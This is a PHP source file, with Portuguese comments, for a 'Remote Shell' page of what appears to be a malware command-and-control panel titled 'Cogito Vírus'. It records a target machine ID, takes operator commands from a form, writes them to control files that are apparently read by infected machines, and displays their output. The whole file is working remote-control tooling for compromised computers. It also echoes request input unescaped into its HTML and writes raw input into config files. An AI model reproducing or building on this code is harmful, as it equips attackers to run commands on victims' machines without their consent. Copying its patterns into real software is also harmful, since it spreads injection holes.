<?php
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 
// 9984583882626455.php / RemoteShell.php ~~
//    Arquivo responsável por executar comandos remotamente no sistema, Remote Shell...
//    
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	error_reporting(0);
	session_start();
	
	include("../modules/extras/global.php");	// Dados globais.
	include("../config.php");					// Configurações.
	include("0923840923949455.php");			// Itens globais do site.
	
	// Verifica login...
	if (!isset($_SESSION["LNG"])) { die($errorPage); }
	
	// Seta comando no arquivo de controle central...
	$UID = $_GET["UID"];
	$buf = "[CTLCTR]\nUID=". $UID ."\nCMD=874788768\n";
	$es = fopen("../databases/CTLCentral.ini", "w"); 
	if ($es) { fwrite($es, $buf); fclose($es); }

	if (isset($_POST["IDX"])) {
	
		$IDX = $_POST["IDX"];
		if ($IDX == 1) {
			// Envia comando
			if (isset($_POST["cmdx"])) {
				// Seta comando no arquivo de controle
				$buf = "[CTL]\nCMX=". $_POST["cmdx"] ."\n";
				$es = fopen("../modules/rmsxl/CTL.ini", "w");
				if ($es) { fwrite($es, $buf); fclose($es); }
			}
		}
		
		if ($IDX == 2) {
			// Limpa conexão
			$buf = "[CTL]\nCN=0\n"; $file = fopen("../modules/rmsxl/CTLCN.ini", "w");
			if ($file) { fwrite($file, $buf); fclose($file); }
			
			$buf = " "; $file = fopen("../modules/rmsxl/LGX/TEMP.txt", "w");
			if ($file) { fwrite($file, $buf); fclose($file); }
		}
	}
?>
<html><head>
<meta content="text/html; charset=UTF-8" http-equiv="Content-Type" />
<title> Cogito V&iacute;rus :: M&aacute;quinas</title>
<link rel="shortcut icon" href="<?php echo $faviconGL; ?>" type="image/x-icon" />
<link href="../midia/SiteFL/style.css" rel="stylesheet" type="text/css" />

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js"></script>
<script type="text/javascript">
	function FocusOnInput () {
		document.getElementById("cmdx").focus();
	}
	 
	function SendX ( IDX ) {
		if (IDX == 1) {
			document.form.IDX.value = "1";
			document.form.submit();
		}

		if (IDX == 2) {
			document.form.IDX.value = "2";
			document.form.submit();
		}
	}
	
	if (document.layers) {
	  document.captureEvents(Event.KEYDOWN);
	}

	// http://stackoverflow.com/questions/155188/trigger-a-button-click-with-javascript-on-the-enter-key-in-a-text-box
	document.onkeydown = function (evt) {
		var keyCode = evt ? (evt.which ? evt.which : evt.keyCode) : event.keyCode;
		if (keyCode == 13) {
			SendX (1);
		} if (keyCode == 27) {
			SendX (1);
		} else {
			return true;
		}
	};
	
</script></head><body onload="FocusOnInput()">
<form name="form" method="post" enctype="multipart/form-data">
<input type="hidden" name="IDX" value="0" />
<center><pre><font style="color: white;"><?php echo $TopoMenu; ?><!-- Exibe topo e menu -->
|                                                                                                                                 |
|===/ <font style="color: #d6ef39;">CONEXÃO:</font> <?php 

	$INICNX = parse_ini_file("../modules/rmsxl/CTLCN.ini", 'CTL');
	$INICN = $INICNX['CTL']['CN'];

	if(strcmp($INICN, "1") == 0) {
		echo "<font style=\"color: green;\"><b>ON </b></font>";
	} else {
		echo "<font style=\"color: red;\"><b>OFF</b></font>";
	}
?> /                                                                                                              |
|                                                                                                                                 |
| [ <a href="9984583882626455.php?UID=<?php echo $_GET["UID"]; ?>" >ATUALIZAR CONEX&Atilde;O</a> ]                                                                                           [ <a href="#" onclick="Javascript: SendX(2);" >DESCONECTAR</a> ] |
<textarea class="textareay" id="textareay" cols="127" rows="25">
<?php

// Saida...
$LogFile = "../modules/rmsxl/LGX/TEMP.txt"; $Ler = fopen($LogFile, "r"); 
$BufLog = fread($Ler, filesize($LogFile)); fclose($Ler); echo $BufLog;

?>
</textarea><script type="text/javascript">
var elem = document.getElementById('textareay'); elem.scrollTop = elem.scrollHeight;
</script>
<input style="background-color: green; color: black; border: 0;" type="text" name="cmdx" value="" maxlength="254" id="cmdx" size="171">
|                                                                                                                                 |<?php echo $RodapeCV; ?> <!-- Exibe rodapé -->
</font></pre></center></form></body></html>
<?php
// EOF  ~~ 
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
?>
